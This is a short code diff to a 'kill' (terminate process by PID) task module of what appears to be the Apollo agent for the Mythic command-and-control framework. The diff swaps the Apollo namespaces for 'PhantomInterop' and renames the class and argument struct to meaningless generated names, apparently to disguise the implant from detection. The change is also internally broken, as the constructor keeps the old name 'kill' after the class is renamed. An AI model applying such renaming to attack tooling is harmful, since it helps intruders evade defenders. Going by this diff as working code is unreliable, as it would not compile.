@@ -6,23 +6,23 @@
 
 #if KILL
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class kill : Tasking
+    public class StrategicController500D : Tasking
     {
         [DataContract]
-        internal struct KillArguments
+        internal struct PhantomTracker9F12
         {
             [DataMember(Name = "pid")]
             public int PID;
         }
-        public kill(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public kill(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
